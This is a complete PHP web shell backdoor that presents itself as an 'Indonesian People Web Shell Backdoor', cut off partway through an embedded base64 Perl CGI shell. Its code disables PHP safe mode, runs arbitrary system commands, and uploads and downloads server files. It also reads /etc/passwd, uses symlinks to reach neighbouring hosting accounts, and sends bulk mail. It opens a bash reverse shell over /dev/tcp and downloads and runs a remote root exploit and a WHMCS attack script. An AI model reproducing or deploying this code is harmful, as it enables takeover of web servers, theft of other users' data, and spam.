<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$phi = fopen("php.ini","w+");
fwrite($phi,"safe_mode = Off
disable_functions = NONE
safe_mode_gid = OFF
open_basedir = OFF ");
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<html>
<head>
<title>Indonesian People Web Shell Backdoor</title>
<link href='http://azzat.wap.mu/favicon.ico' rel='shortcut icon' alt='icon'>
<meta name='author' content='AZZATSSINS'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Ubuntu);
html {
    background: #000000;
    color: #ffffff;
    font-family: 'Ubuntu';
	font-size: 13px;
	width: 100%;
}
li {
	display: inline;
	margin: 5px;
	padding: 5px;
}
table, th, td {
	border-collapse:collapse;
	font-family: Tahoma, Geneva, sans-serif;
	background: transparent;
	font-family: 'Ubuntu';
	font-size: 13px;
}
.table_home, .th_home, .td_home {
	border: 1px solid #ffffff;
}
th {
	padding: 10px;
}
a {
	color: #ffffff;
	text-decoration: none;
}
a:hover {
	color: gold;
	text-decoration: underline;
}
b {
	color: gold;
}
input[type=text], input[type=password],input[type=submit] {
	background: transparent; 
	color: #ffffff; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
textarea {
	border: 1px solid #ffffff;
	width: 100%;
	height: 400px;
	padding-left: 5px;
	margin: 10px auto;
	resize: none;
	background: transparent;
	color: #ffffff;
	font-family: 'Ubuntu';
	font-size: 13px;
}
select {
	width: 152px;
	background: #000000; 
	color: lime; 
	border: 1px solid #ffffff; 
	margin: 5px auto;
	padding-left: 5px;
	font-family: 'Ubuntu';
	font-size: 13px;
}
option:hover {
	background: lime;
	color: #000000;
}
</style>
</head>
<?php
function w($dir,$perm) {
	if(!is_writable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir,$perm) {
	if(!is_readable($dir)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function exe($cmd){
	$xazx = "";
	$cmd = $cmd." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('shell_exec')){
		$xazx = @shell_exec($cmd);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('exec')) {
		@exec($cmd,$azxr);
		if(!empty($azxr)) foreach($azxr as $azxs) $xazx .= $azxs;
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($cmd);
		$xazx = ob_get_contents();
		ob_end_clean();
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('proc_open')) {
		$azxdescriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$azxproc = @proc_open($cmd, $azxdescriptorspec, $azxpipes, getcwd(), array());
		if (is_resource($azxproc)) {
			while ($azxsi = fgets($azxpipes[1])) {
				if(!empty($azxsi)) $xazx .= $azxsi;
			}
			while ($azxse = fgets($azxpipes[2])) {
				if(!empty($azxse)) $xazx .= $azxse;
			}
		}
		@proc_close($azxproc);
		if(!empty($xazx)) return $xazx;
	}
	if(is_callable('popen')){
		$azxf = @popen($cmd, 'r');
		if($azxf){
			while(!feof($azxf)){
				$xazx .= fread($azxf, 2096);
			}
			pclose($azxf);
		}
		if(!empty($xazx)) return $xazx;
	}
	return "";
}

function perms($file){
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function hdd($s) {
	if($s >= 1073741824)
	return sprintf('%1.2f',$s / 1073741824 ).' GB';
	elseif($s >= 1048576)
	return sprintf('%1.2f',$s / 1048576 ) .' MB';
	elseif($s >= 1024)
	return sprintf('%1.2f',$s / 1024 ) .' KB';
	else
	return $s .' B';
}
function ambilKata($param, $kata1, $kata2){
    if(strpos($param, $kata1) === FALSE) return FALSE;
    if(strpos($param, $kata2) === FALSE) return FALSE;
    $start = strpos($param, $kata1) + strlen($kata1);
    $end = strpos($param, $kata2, $start);
    $return = substr($param, $start, $end - $start);
    return $return;
}
function getsource($url) {
    $curl = curl_init($url);
    		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
    $content = curl_exec($curl);
    		curl_close($curl);
    return $content;
}

if(get_magic_quotes_gpc()) {
	function azzatssinsx($array) {
		return is_array($array) ? array_map('azzatssinsx', $array) : stripslashes($array);
	}
	$_POST = azzatssinsx($_POST);
	$_COOKIE = azzatssinsx($_COOKIE);
}

if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$kernel = php_uname();
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$ds = @ini_get("disable_functions");
$mysql = (function_exists('mysql_connect')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$curl = (function_exists('curl_version')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$wget = (exe('wget --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$perl = (exe('perl --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$python = (exe('python --help')) ? "<font color=lime>ON</font>" : "<font color=red>OFF</font>";
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>NONE</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

if($_GET['server'] == 'info') {
echo "System: <font color=lime>".$kernel."</font><br>";
echo "User: <font color=lime>".$user."</font> (".$uid.") Group: <font color=lime>".$group."</font> (".$gid.")<br>";
echo "Server IP: <font color=lime>".$ip."</font> | Your IP: <font color=lime>".$_SERVER['REMOTE_ADDR']."</font><br>";
echo"Config File: "; if(is_readable("/etc/named.conf")){

echo '[<font color=lime>/etc/named.conf</font>] ';

}else{

echo '[<font color=red>/etc/named.conf</font>] ';

}

if(is_readable("/etc/passwd")){

echo '[<font color=lime>/etc/passwd</font>] ';

}else{

echo '[<font color=red>/etc/passwd</font>] ';

}

if(is_readable("/etc/valiases")){

echo '[<font color=lime>/etc/valiases</font>] ';
}else{

echo '[<font color=red>/etc/valiases</font>] ';

}

if(is_readable("/var/named")){

echo '[<font color=lime>/var/named</font>] ';
}else{

echo '[<font color=red>/var/named</font>] ';

}
echo "<br>Disable Functions: $show_ds<br>";
echo "MySQL: $mysql | Perl: $perl | Python: $python | WGET: $wget | CURL: $curl <br>";
}
echo "Current DIR: ";
foreach($scdir as $c_dir => $cdir) {	
	echo "<a href='?dir=";
	for($i = 0; $i <= $c_dir; $i++) {
		echo $scdir[$i];
		if($i != $c_dir) {
		echo "/";
		}
	}
	echo "'>$cdir</a>/";
}
echo "&nbsp;&nbsp;[ ".w($dir, perms($dir))." ]<br>";
	echo "<center></fieldset>";
	$a=$_SERVER;
$h=$a['HTTP_HOST'].$a['SCRIPT_NAME'];
	if($_POST['upload']) {
		if($_POST['tipe_upload'] == 'biasa') {
			if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
				$act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		} else {
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
				if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
					$act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
				} else {
					$act = "<font color=red>failed to upload file</font>";
				}
			} else {
				$act = "<font color=red>failed to upload file</font>";
			}
		}
	}
	echo "<form method='post' enctype='multipart/form-data'>
	<input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ] 
	<input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
	<input type='file' name='ix_file'>
	<input type='submit' value='upload' name='upload'>
	</form>";
	echo $act;
echo "</fieldset></center><br>";
echo "<center>";
echo "<fieldset><ul><b>";
echo "<li>[ <a href='?'>HOME</a> ]</li>";
echo "<li>[ <a href='?server=info'>SERVER INFO</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=whmcs'>WHMCS DECODER</a> ]</li>";
echo "<li>[ <a href='?whmcs=killer'>WHMCS KILLER</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=mass_deface'>AUTO MASS</a> ]</li>";
echo "<li>[ <a href='?config=grabber'>CONFIGS</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=jumping'>JUMPING</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPFTP CRACK</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=zoneh'>ZONE-H</a> ]</li>";
echo "<li>[ <a href='?open=ports'>OPEN PORT</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=cgi'>PERL5HELL</a> ]</li>";
echo "<li>[ <a href='?mysql=connect'>MYSQL</a> ]</li><br>";
echo "<li>[ <a href='?symbolic=link'>SYMLINK</a> ]</li>";
echo "<li>[ <a href='?sym=404'>SYM404</a> ]</li>";
echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>CHANGE USER</a> ]</li>";
echo "<li>[ <a href='?simple=rooter'>SERVEROOT</a> ]</li>";
echo "<li>[ <a href='?simple=mailer'>MAILER</a> ]</li>";
echo "<li>[ <a href='?reverse=connect'>REVERSHELL</a> ]</li>";
echo "<li>[ <a style='color: red;' href='?kill=self'>KILLSELF</a> ]</li>";
echo "</b></ul></fieldset>";
echo "</center>";
echo "<br><fieldset>";
	echo "<form method='post'>
<font style='text-decoration: underline;'>Command : </font>
<input type='text' size='30' height='10' name='cmd'><input type='submit' name='azx' value='>>'>
	</form>	";
	if(isset($_POST['azx']))
{
 
echo'<br><div style="background:#6d6d6d;margin:0px;padding:1px;text-align:left;color:lime;"><pre>';
$cmd = $_POST['cmd'];
if($cmd == "")
{
 
echo "Please Insert Command!";
 }
 
elseif(isset($cmd))
 {
 $output = exe($cmd);
 echo $output; }
echo'</pre></div><br><br>';
}
echo "</fieldset><br>";
/*AUTHOR : AZZATSSINS*/
echo '<fieldset><center><u><b>TETANGGA SEBELAH</u><br><form method="post">
<center>
Method : 
<select name="anu">
<option title="sym" value="sym/azzatssins.txt/">Symlink</option>
<option title="jump" value="?dir=/">Jumping</option>
</select> ~ User From : 
<select name="lol">
<option title="etc" value="etc">/etc/passwd</option>
<option title="var" value="var">/var/mail</option>
</select><br> ~ Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
<option title="home11" value="home11">home11</option>
<option title="home12" value="home12">home12</option>
<option title="home13" value="home13">home13</option>
<option title="home14" value="home14">home14</option>
<option title="home15" value="home15">home15</option>
<option title="home16" value="home16">home16</option>
<option title="home17" value="home17">home17</option>
<option title="home18" value="home18">home18</option> 
<option title="home19" value="home19">home19</option>
</select> ~ .htaccess : 
<select name="azztssns">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex azzatssins.cyberserkers
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex azzatssins.cyberserkers
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select><br>
<input style="color:red;background-color:#000000" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form>';
$home = $_POST["home"];
$anu = $_POST["anu"];
$lol = $_POST["lol"];
if($lol == "var"){
@mkdir('sym',0777);
$htaccess = $_POST['azztssns'];
file_put_contents("sym/.htaccess",$htaccess,FILE_APPEND);
@symlink('/','sym/azzatssins.txt');
$rdr = readdir("/var/mail");
foreach($rdr as $rdd){
echo '<table align="center" border="3" width="400" cellspacing="0" cellpadding="0">
<td align="center"> <font color="white"> <b>>>USERS<<</b></td>
<td align="center"> <font color="white"> <b>>>INTIPS<<</b></center></td>';
echo "<tr>
<td align='center'><font color='white'>".$rdd."</td>
<td align='center'><a href='".$anu.$home."/".$rdd."/public_html/' target='_blank'>Symlink</a></td></tr>";
}}
if($lol == "etc"){
@mkdir('sym',0777);
$htaccess = $_POST['azztssns'];
file_put_contents("sym/.htaccess",$htaccess,FILE_APPEND);
@symlink('/','sym/azzatssins.txt');
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
echo '<table align="center" border="3" width="400" cellspacing="0" cellpadding="0">
<td align="center"> <font color="white"> <b>>>USERS<<</b></td>
<td align="center"> <font color="white"> <b>>>SYMLINK<<</b></center></td>';
echo "<tr>
<td align='center'><font color='white'>".$str[0]."</td>
<td align='center'><a href='".$anu.$home."/".$str[0]."/public_html/' target='_blank'>Symlink</a></td></tr>";
}
}
echo '</center></fieldset><br>';
if($_GET['simple'] == 'mailer') {
echo '<h1>Simple Mailer</h1><br>
		<form method="post">
		From :<br>
			<input value="azzatssins@cyberserkers.int" name="From"/><br>
		Subject :<br>
			<input name="Subject"/><br>
		Name :<br>
			<input name="Name"/><br>
		Message :<br>
			<textarea name="Message" rows="10" cols="30"></textarea><br>
		Emails :<br>
			<textarea name="Emails" rows="10" cols="30"></textarea><br>
			<input type="submit" name="send" value="Send">
			</form>';
	/*AZZATSSINS*/
if(@isset($_POST['send'])){
$From 	= $_POST['From'];
$Subject	= $_POST['Subject'];
$Message	=	$_POST['Message'];
$Emails	=	$_POST['Emails'];
$Name		= $_POST['Name'];
$headers	= "MIME-Version: 1.0\r\n";
$headers .=	"Content-type:text/html;charset=UTF-8\r\n";
$headers	.= "From: <".$From.">\r\n";
$headers	.= "Cc: ".$Name."\r\n";
$Emails	= explode("\r\n", $_POST['Emails']);
foreach($Emails as $email) {
if(mail($email,$Subject,$Message,$headers)){
echo "<br>Sending Email To : ".$email." => OK";
}
else{
echo "<br>Sending Email To : ".$email." => Fail";
				}
			}
		}
		}
$z=str_replace("%&@!","z","a%&@!x");
if($_GET['simple'] == 'rooter') {
echo"<form method=post><span>Just work in kernel -2016</span><br><hr><br>>> Login: ( ssh azzatssins@".$ip." ) or ( su azzatssins )<br/><hr><br>
New Password : <input type='text' name='passwd' value='17081945'> <input type=submit name=azzzt value='Root'></form><br>";
if($_POST['azzzt']) {
exe("wget https://raw.githubusercontent.com/cyberserkers/root/master/azx && chmod +x azx && ./azx ".$_POST['passwd']);
}}
if($_GET['open'] == 'ports') {
echo "<pre>";
print exe("netstat -an | grep -i listen 2>&1");
echo "</pre><br>";
}
$x=str_replace("%","y","c%");
if($_GET['whmcs'] == 'killer') {
echo'<form method="post">
<center>
<br><u>Input WHMCS configuration.php</u><br><textarea style="color:red;background-color:#000000" cols="60" name="azztssns" rows="20"></textarea><br><input style="color:red;background-color:#000000" name="conf" size="10"
 value="Fuck it!!!" type="submit">
<br/><br/></form></center>';
if ($_POST['conf']) {
$configuration = $_POST['azztssns'];
file_put_contents("configuration.php",$configuration,FILE_APPEND);
$scr = file_get_contents("http://pastebin.com/raw/31kP3Dp8");
$fel = fopen("wk.php", "w");
fwrite($fel, $scr);
system('wget -O wk.php http://pastebin.com/raw/31kP3Dp8');
echo'<meta http-equiv="Refresh" content= "0; url=wk.php">';
}
}
$i=str_replace("#%","e","b#%rs#%rk#%rs");
if($_GET['reverse'] == 'connect') {
echo '<form method="post">IPAddr : <input name="prx"  value="'. $_SERVER['REMOTE_ADDR'] .'">                 PORT : <input name="prt" value="110"><input type="submit" value="Connect" name="revershell"></form>';
if($_POST['revershell']){ 
exe("bash -i >& /dev/tcp/".$_POST['prx']."/".$_POST['prt']." 0>&1"); }
echo "<br>"; }
$l=str_replace("!","@","!g");
if($_GET['do'] == 'cgi') {
$cgi = base64_decode("IyEvdXNyL2Jpbi9wZXJsCiMgQVpaQVRTU0lOUyBDWUJFUlNFUktFUlMKIyBBWjQwNAp1c2UKTUlN
RTo6QmFzZTY0OwpldmFsKGRlY29kZV9iYXNlNjQoJ0l5RXZkWE55TDJKcGJpOXdaWEpzSUMxSkwz
VnpjaTlzYjJOaGJDOWlZVzVrYldsdURRb2tUbFJEYldSVFpYQWdQU0FpSmlJN0RRb2sKVlc1cGVF
TnRaRk5sY0NBOUlDSTdJanNOQ2lSRGIyMXRZVzVrVkdsdFpXOTFkRVIxY21GMGFXOXVJRDBnTXpB
d093MEtKRk5vYjNkRQplVzVoYldsalQzVjBjSFYwSUQwZ01Uc05DaVJoZW5waGRITnphVzV6SUQw
Z0lrRmFOREEwSWpzTkNpUkRiV1JUWlhBZ1BTQW9KRmRwCmJrNVVJRDhnSkU1VVEyMWtVMlZ3SURv
Z0pGVnVhWGhEYldSVFpYQXBPdzBLSkVOdFpGQjNaQ0E5SUNna1YybHVUbFFnUHlBaVkyUWkKSURv
Z0luQjNaQ0lwT3cwS0pGQmhkR2hUWlhBZ1BTQW9KRmRwYms1VUlEOGdJbHhjSWlBNklDSXZJaWs3
RFFva1VtVmthWEpsWTNSdgpjaUE5SUNna1YybHVUbFFnUHlBaUlESStKakVnTVQ0bU1pSWdPaUFp
SURFK0pqRWdNajRtTVNJcE93MEtjM1ZpSUZKbFlXUlFZWEp6ClpRMEtldzBLYkc5allXd2dLQ3Bw
YmlrZ1BTQkFYeUJwWmlCQVh6c05DbXh2WTJGc0lDZ2thU3dnSkd4dll5d2dKR3RsZVN3Z0pIWmgK
YkNrN0RRb05DaVJOZFd4MGFYQmhjblJHYjNKdFJHRjBZU0E5SUNSRlRsWjdKME5QVGxSRlRsUmZW
RmxRUlNkOUlEMStJQzl0ZFd4MAphWEJoY25SY0wyWnZjbTB0WkdGMFlUc2dZbTkxYm1SaGNuazlL
QzRyS1NRdk93MEtEUXBwWmlna1JVNVdleWRTUlZGVlJWTlVYMDFGClZFaFBSQ2Q5SUdWeElDSkhS
VlFpS1EwS2V3MEtKR2x1SUQwZ0pFVk9WbnNuVVZWRlVsbGZVMVJTU1U1SEozMDdEUXA5RFFwbGJI
TnAKWmlna1JVNVdleWRTUlZGVlJWTlVYMDFGVkVoUFJDZDlJR1Z4SUNKUVQxTlVJaWtOQ25zTkNt
SnBibTF2WkdVb1UxUkVTVTRwSUdsbQpJQ1JOZFd4MGFYQmhjblJHYjNKdFJHRjBZU0FtSUNSWGFX
NU9WRHNOQ25KbFlXUW9VMVJFU1U0c0lDUnBiaXdnSkVWT1Zuc25RMDlPClZFVk9WRjlNUlU1SFZF
Z25mU2s3RFFwOURRcHBaaWdrUlU1V2V5ZERUMDVVUlU1VVgxUlpVRVVuZlNBOWZpQXZiWFZzZEds
d1lYSjAKWEM5bWIzSnRMV1JoZEdFN0lHSnZkVzVrWVhKNVBTZ3VLeWtrTHlrTkNuc05DaVJDYjNW
dVpHRnllU0E5SUNjdExTY3VKREU3RFFwQQpiR2x6ZENBOUlITndiR2wwS0M4a1FtOTFibVJoY25r
dkxDQWthVzRwT3cwS0pFaGxZV1JsY2tKdlpIa2dQU0FrYkdsemRGc3hYVHNOCkNpUklaV0ZrWlhK
Q2IyUjVJRDErSUM5Y2NseHVYSEpjYm54Y2JseHVMenNOQ2lSSVpXRmtaWElnUFNBa1lEc05DaVJD
YjJSNUlEMGcKSkNjN0RRb2tRbTlrZVNBOWZpQnpMMXh5WEc0a0x5ODdEUW9rYVc1N0oyWnBiR1Zr
WVhSaEozMGdQU0FrUW05a2VUc05DaVJJWldGawpaWElnUFg0Z0wyWnBiR1Z1WVcxbFBWd2lLQzRy
S1Z3aUx6c05DaVJwYm5zblppZDlJRDBnSkRFN0RRb2thVzU3SjJZbmZTQTlmaUJ6Ckwxd2lMeTlu
T3cwS0pHbHVleWRtSjMwZ1BYNGdjeTljY3k4dlp6c05DZzBLSXlCd1lYSnpaU0IwY21GcGJHVnlE
UXBtYjNJb0pHazkKTWpzZ0pHeHBjM1JiSkdsZE95QWthU3NyS1EwS2V3MEtKR3hwYzNSYkpHbGRJ
RDErSUhNdlhpNHJibUZ0WlQwa0x5ODdEUW9rYkdsegpkRnNrYVYwZ1BYNGdMMXdpS0Z4M0t5bGNJ
aTg3RFFva2EyVjVJRDBnSkRFN0RRb2tkbUZzSUQwZ0pDYzdEUW9rZG1Gc0lEMStJSE12CktGNG9Y
SEpjYmx4eVhHNThYRzVjYmlrcGZDaGNjbHh1Skh4Y2JpUXBMeTluT3cwS0pIWmhiQ0E5ZmlCekx5
VW9MaTRwTDNCaFkyc28KSW1NaUxDQm9aWGdvSkRFcEtTOW5aVHNOQ2lScGJuc2thMlY1ZlNBOUlD
UjJZV3c3RFFwOURRcDlEUXBsYkhObElDTWdjM1JoYm1SaApjbVFnY0c5emRDQmtZWFJoSUNoMWNt
d2daVzVqYjJSbFpDd2dibTkwSUcxMWJIUnBjR0Z5ZENrTkNuc05Da0JwYmlBOUlITndiR2wwCktD
OG1MeXdnSkdsdUtUc05DbVp2Y21WaFkyZ2dKR2tnS0RBZ0xpNGdKQ05wYmlrTkNuc05DaVJwYmxz
a2FWMGdQWDRnY3k5Y0t5OGcKTDJjN0RRb29KR3RsZVN3Z0pIWmhiQ2tnUFNCemNHeHBkQ2d2UFM4
c0lDUnBibHNrYVYwc0lESXBPdzBLSkd0bGVTQTlmaUJ6THlVbwpMaTRwTDNCaFkyc29JbU1pTENC
b1pYZ29KREVwS1M5blpUc05DaVIyWVd3Z1BYNGdjeThsS0M0dUtTOXdZV05yS0NKaklpd2dhR1Y0
CktDUXhLU2t2WjJVN0RRb2thVzU3Skd0bGVYMGdMajBnSWx3d0lpQnBaaUFvWkdWbWFXNWxaQ2dr
YVc1N0pHdGxlWDBwS1RzTkNpUnAKYm5za2EyVjVmU0F1UFNBa2RtRnNPdzBLZlEwS2ZRMEtmUTBL
RFFwemRXSWdabTl2RFFwN0RRcHRlU0FvSUNSc2IyZHBiaXdnSkhBcwpJQ1IxYVdRc0lDUm5hV1Fz
SUNSblpXTnZjeXdnSkdScGNpd2dKSE1nS1RzTkNnMEtiWGtnSlVodlNDQTlJQ2dwT3cwS0RRcHRl
U0FrClptbHNaU0E5SUNjdlpYUmpMM0JoYzNOM1pDYzdEUXB2Y0dWdUtDQlFRVk5UVjBRc0lDSThJ
Q1JtYVd4bElpQXBJRzl5SUdScFpTQWkKUTJGdUozUWdiM0JsYmlBa1ptbHNaU0E2SUNRaElqc05D
ZzBLZDJocGJHVW9JRHhRUVZOVFYwUStJQ2tnZXcwS0tDQWtiRzluYVc0cwpJQ1J3TENBa2RXbGtM
Q0FrWjJsa0xDQWtaMlZqYjNNc0lDUmthWElzSUNSeklDa2dQU0J6Y0d4cGRDZ2dKem9uSUNrN0RR
b05DaVJJCmIwaDdJQ1JzYjJkcGJpQjlleUFuZFdsa0p5QjlJRDBnSkhWcFpEc05DaVJJYjBoN0lD
UnNiMmRwYmlCOWV5QW5aMmxrSnlCOUlEMGcKSkdkcFpEc05DaVJJYjBoN0lDUnNiMmRwYmlCOWV5
QW5aR2x5SnlCOUlEMGdKR1JwY2pzTkNuME5DZzBLWTJ4dmMyVWdVRUZUVTFkRQpPdzBLRFFweVpY
UjFjbTRnWENWSWIwZzdEUXA5RFFwemRXSWdVSEpwYm5SUVlXZGxTR1ZoWkdWeURRcDdEUW9rUlc1
amIyUmxaRU4xCmNuSmxiblJFYVhJZ1BTQWtRM1Z5Y21WdWRFUnBjanNOQ2lSRmJtTnZaR1ZrUTNW
eWNtVnVkRVJwY2lBOWZpQnpMeWhiWG1FdGVrRXQKV2pBdE9WMHBMeWNsSnk1MWJuQmhZMnNvSWtn
cUlpd2tNU2t2WldjN0RRcHdjbWx1ZENBaVEyOXVkR1Z1ZEMxMGVYQmxPaUIwWlhoMApMMmgwYld4
Y2JseHVJanNOQ25CeWFXNTBJRHc4UlU1RU93MEtQRzFsZEdFZ1kyOXVkR1Z1ZEQxUVJWSk1WMFZD
TlZOSVJVeE1MVUpaCkxVRmFXa0ZVVTFOSlRsTXRRMWxDUlZKVFJWSkxSVkpUSUc1aGJXVTlaR1Z6
WTNKcGNIUnBiMjQrRFFwRlRrUU5DbjBOQ2cwS2MzVmkKSUZCeWFXNTBURzluYVc1VFkzSmxaVzRO
Q25zTkNpUk5aWE56WVdkbElEMGdjU1FOQ2lRN0RRb2pKdzBLY0hKcGJuUWdQRHhGVGtRNwpEUW9r
VFdWemMyRm5aUTBLUlU1RURRcDlEUXB6ZFdJZ1VISnBiblJNYjJkcGJrWmhhV3hsWkUxbGMzTmha
MlVOQ25zTkNuQnlhVzUwCklEdzhSVTVFT3cwS1BHTnZaR1UrRFFvOFkyVnVkR1Z5UGp4aWNqNVhT
RUZVSUZSSVJTQklSVXhNSUVGU1JTQlpUMVVnUkU5SlRrY3UKTGk0aElTRThZbkkrRFFvOEwyTmxi
blJsY2o0TkNqd3ZZMjlrWlQ0TkNrVk9SQTBLZlEwS0RRcHpkV0lnVUhKcGJuUk1iMmRwYmtadgpj
bTBOQ25zTkNuQnlhVzUwSUR3OFJVNUVPdzBLUEdOdlpHVStEUW84YUhSdGJENE5DanhvWldGa1Bn
MEtQSFJwZEd4bFBsTjBZWEowCklGVnphVzVuSUVOSFNWQnliM2g1UEM5MGFYUnNaVDROQ2p3dmFH
VmhaRDROQ2p4aWIyUjVJRzl1Ykc5aFpEMGlaRzlqZFcxbGJuUXUKVlZKTVptOXliUzVWVWt3dVpt
OWpkWE1vS1NBN0lHbG1JQ2hrYjJOMWJXVnVkQzVWVWt4bWIzSnRMbFZTVEM1MllXeDFaUzV0WVhS
agphQ2d2WGx4NE1ERXZLU2tnWkc5amRXMWxiblF1VlZKTVptOXliUzVWVWt3dWRtRnNkV1U5SUY5
d2NtOTRlVjlxYzJ4cFlsOTNjbUZ3ClgzQnliM2g1WDJSbFkyOWtaU2hrYjJOMWJXVnVkQzVWVWt4
bWIzSnRMbFZTVEM1MllXeDFaUzV5WlhCc1lXTmxLQzljZURBeEx5d2cKSnljcEtTSStEUW84Y0Q0
TkNnMEtQR2d4UGtOSFNWQnliM2g1UEM5b01UNE5Danh3UGxOMFlYSjBJR0p5YjNkemFXNW5JSFJv
Y205MQpaMmdnZEdocGN5QkRSMGt0WW1GelpXUWdjSEp2ZUhrZ1lua2daVzUwWlhKcGJtY2dZU0JW
VWt3Z1ltVnNiM2N1RFFwUGJteDVJRWhVClZGQWdZVzVrSUVaVVVDQlZVa3h6SUdGeVpTQnpkWEJ3
YjNKMFpXUXVJQ0JPYjNRZ1lXeHNJR1oxYm1OMGFXOXVjeUIzYVd4c0lIZHYKY21zTkNpaGxMbWN1
